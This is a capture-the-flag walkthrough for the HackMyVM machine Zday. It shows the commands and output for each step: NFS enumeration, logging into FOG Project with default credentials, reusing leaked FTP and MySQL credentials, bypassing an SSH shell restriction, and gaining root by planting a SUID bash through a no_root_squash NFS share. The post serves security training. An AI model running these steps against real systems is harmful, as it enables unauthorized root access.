---
title: CTF Walkthrough for HackMyVM Machine Zday
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Zday machine]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/box-zday.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Zday a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Zday<br>
Goal: Get two flags<br>
Operating System: Linux<br>
Download link: [Zday](https://downloads.hackmyvm.eu/zday.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance
This machine reveals its IP address on the network after startup so no need for us to discover it again we can start directly with a service scan to identify services running on open ports.
```bash
┌──(pentester㉿kali)-[/Zday/Scans/Service]
└─$ sudo nmap 10.0.2.5 -n -Pn -sC -sV -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 09:02 BST
Nmap scan report for 10.0.2.5
Host is up (0.00029s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ee:01:82:dc:7a:00:0e:0e:fc:d9:08:ca:d8:7e:e5:2e (RSA)
|   256 44:af:47:d8:9f:ea:ae:3e:9f:aa:ec:1d:fb:22:aa:0f (ECDSA)
|_  256 6a:fb:b4:13:64:df:6e:75:b2:b9:4e:f1:92:97:72:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
<SNIP>
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
443/tcp  open  http    Apache httpd 2.4.38
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
2049/tcp open  nfs     3-4 (RPC #100003)
3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
<SNIP>
Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```
This machine appears to run FTP, SSH, HTTP, NFS, and MySQL services. From the scan, we can see that FTP anonymous login is not enabled so let's try to see if the is any share we can access on the NFS service.
```bash
┌──(pentester㉿kali)-[/Zday/Scans/Service]
└─$ showmount -e 10.0.2.5
Export list for 10.0.2.5:
/images/dev *
/images     *
```
We see that NFS has accessible shares, let's mount it to see if we can get any interesting information.
```bash
┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ mkdir  nfs-share

┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ sudo mount -t nfs 10.0.2.5:/images   nfs-share         
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.

┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ ls nfs-share          
dev  postdownloadscripts
```
We can see that this system didn't require any form of authentication but unfortunately for us browsing the share doesn't reveal anything interesting.
```bash
┌──(pentester㉿kali)-[/Zday/Misc File/nfs-share]
└─$ ls -lRa
total 16
<SNIP>
-rwxrwxrwx 1        1001 root           0 Mar 10  2021 .mntcheck
drwxrwxrwx 3        1001 root        4096 Mar 10  2021 dev
drwxrwxrwx 2        1001 root        4096 Mar 10  2021 postdownloadscripts
./dev:
total 12
<SNIP>
-rwxrwxrwx 1 1001 root    0 Mar 10  2021 .mntcheck
drwxrwxrwx 2 1001 root 4096 Mar 10  2021 postinitscripts
./dev/postinitscripts:
total 12
<SNIP>
-rwxrwxrwx 1 1001 root  249 Mar 10  2021 fog.postinit
./postdownloadscripts:
total 12
<SNIP>
-rwxrwxrwx 1 1001 root  235 Mar 10  2021 fog.postdownload
```
This share doesn't contain anything for us so, let's move to the web server.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/1-browse.png){: .center}

This appears to be the Apache default installation page. Let's fuzz this page to see if we can uncover any hidden directories.
```bash
┌──(pentester㉿kali)-[/Zday/Scans/Service]
└─$ ffuf -ic -c -u http://10.0.2.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php 
<SNIP>

index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 8ms]
fog                     [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 19ms]
:: Progress: [175302/175302] :: Job [1/1] :: 904 req/sec :: Duration: [0:01:31] :: Errors: 0 ::
```
We discovered an index.php page and a fog directory. Both this page and this directory redirect us to a login form.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/login-form.png){: .center}

## Exploitation
This page appears to be that of the FOG Project. Since this was my first time to encounter this, I quickly did a Google search which revealed that *The FOG Project is a software project that implements FOG, a software tool that can deploy disk images of Microsoft Windows and Linux using the Preboot Execution Environment. It makes use of TFTP, the Apache web server, and iPXE.* My approach when I encounter web-based software is to look online for default credentials.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/default-cred.png){: .center}

When we try these credentials on the login form we see that we can successfully log in.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/web-app-auth.png){: .center}

When we successfully log into the web application we can start enumerating the web interface to see if we can uncover something useful. Upon several enumerations \(i.e Clicking everywhere to understand what the application does, how it does it, and how it manages its resources\), I uncovered credentials for the FTP and MySQL services.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/ftp-creds.png){: .center}

![](/assets/img/posts/walthrough/hackmyvm/2024-09-11-zday/db-creds.png){: .center}

We can use these credentials to log into both services and continue our enumeration.
```bash
┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ mysql -h 10.0.2.5 -u fogstorage  -p --skip-ssl 
Enter password: 
<SNIP
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

```bash
┌──(pentester㉿kali)-[/Zday/Scans/Service]
└─$ ftp 10.0.2.5
Connected to 10.0.2.5.
220 (vsFTPd 3.0.3)
Name (10.0.2.5:pentester): fogproject
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
When we enumerate the system using the FTP, we can see that our current directory is under the **/home** parent directory. This tells us that the user fogproject is also a local system user.
```bash
ftp> pwd
Remote directory: /home/fogproject
ftp> 
```
Unfortunately, When we try to log in using the same password we can see that access to the default ssh shell is refused.
```bash
┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ ssh fogproject@10.0.2.5 
fogproject@10.0.2.5's password: 
Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 11 10:19:53 2024 from 10.0.2.15
You seem to be using the 'fogproject' system account to logon and work 
on your FOG server system.

It's NOT recommended to use this account! Please create a new 
account for administrative tasks.

If you re-run the installer it would reset the 'fog' account 
password and therefore lock you out of the system!

Take care, 
your FOGproject team
Connection to 10.0.2.5 closed.
```
A common way to bypass this is to force the pseudo-terminal allocation by setting another shell for login. This is done using the **-t** argument.
```bash
┌──(pentester㉿kali)-[/Zday/Misc File]
└─$ ssh fogproject@10.0.2.5 -t /bin/sh
fogproject@10.0.2.5's password: 
$ whoami
fogproject
$ 
```

## Post Exploitation
Remember that the target is running an NFS server, a common misconfiguration in this service is to set the **no_root_squash** option on directories. This option gives authority to the root user on the client to access files on the NFS server as root. It means that the root user on the client can perform actions on the share as the root user on the machine hosting the share. We can exploit this by setting the SUID bit as root to executables in the share. Let's first check if this option is set by looking in the configuration file of NFS.
```bash
$ cat /etc/exports
/images *(ro,sync,no_wdelay,no_subtree_check,insecure_locks,no_root_squash,insecure,fsid=0)
/images/dev *(rw,async,no_wdelay,no_subtree_check,no_root_squash,insecure,fsid=1)
$ 
```
 We can see that no_root_squash is enabled on both shares but only the /images/dev share is writable so let's unmount the /images share we mounted above and mount this one.
```bash
┌──(root㉿kali)-[~whitemiller/Desktop/HackMyVM/Zday/Misc File]
└─# umount nfs-share

┌──(root㉿kali)-[~whitemiller/Desktop/HackMyVM/Zday/Misc File]
└─# mount -t nfs 10.0.2.5:/images/dev nfs-share
```
Since we use different versions of Linux with the target, we can't copy our version of bash to the target or it will not work. Hence, we will use the fogproject user to copy the target's bash shell and place it in the NFS share dev directory located at **/images/dev**.
```bash
$ cp /bin/bash /images/dev/
$ ls -l /images/dev/
total 1148
-rwxr-xr-x 1 fogproject fogproject 1168776 Sep 11 12:24 bash
drwxrwxrwx 2 fogproject root          4096 Mar 10  2021 postinitscripts
$ 
```
We now use our root user to change the ownership of that shell copied into the NFS share and set the SUID bit.
```bash
┌──(root㉿kali)-[/Zday/Misc File]
└─# ls -l nfs-share
-rwxr-xr-x 1 1001 1001 1168776 Sep 11 17:24 bash
drwxrwxrwx 2 1001 root    4096 Mar 10  2021 postinitscripts

┌──(root㉿kali)-[/Zday/Misc File]
└─# chown root:root nfs-share/bash

┌──(root㉿kali)-[/Zday/Misc File]
└─# chmod 4755 nfs-share/bash     

┌──(root㉿kali)-[/Zday/Misc File]
└─# ls -l nfs-share            
-rwsr-xr-x 1 root root 1168776 Sep 11 17:24 bash
drwxrwxrwx 2 1001 root    4096 Mar 10  2021 postinitscripts
```
We can go back to our ssh session and run the bash shell which has the SUID bit set by our root user.
```bash
$ ls -l /images/dev 
total 1148
-rwsr-xr-x 1 root       root 1168776 Sep 11 12:24 bash
drwxrwxrwx 2 fogproject root    4096 Mar 10  2021 postinitscripts
$whoami
fogproject
$ /images/dev/bash -p
bash-5.0# whoami
root
```
Great, we have obtained a root shell on the target. With this access, we can read the root flag and that of the other user on the system.
```bash
bash-5.0# ls /root
flag.sh  root.txt
bash-5.0# ls /home/
estas  fogproject
bash-5.0# ls /home/estas
flag.sh  user.txt
```
## Conclusion
Congratulations! In this walkthrough, you have exploited a web application that used default credentials to uncover local user credentials. You continued by leveraging NFS service misconfiguration to escalate privileges on this system and obtained a root shell on the target. This machine illustrated how using default credentials and misconfiguring services can significantly compromise an organisation's security posture. Thank you for following up on this walkthrough.

